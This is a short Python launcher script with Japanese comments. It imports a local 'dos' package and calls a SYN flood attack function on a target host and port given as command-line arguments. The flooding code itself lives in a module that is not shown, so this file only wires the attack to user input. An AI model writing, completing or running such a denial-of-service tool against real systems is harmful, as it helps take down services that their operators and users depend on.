import sys
# pychacheを作成しない
#sys.dont_write_bytecode = True
from dos import syn_flood
import argparse

class Main:
    # SYN Flood攻撃
    syn_flood.syn_flood_attack(sys.argv[1], sys.argv[2])
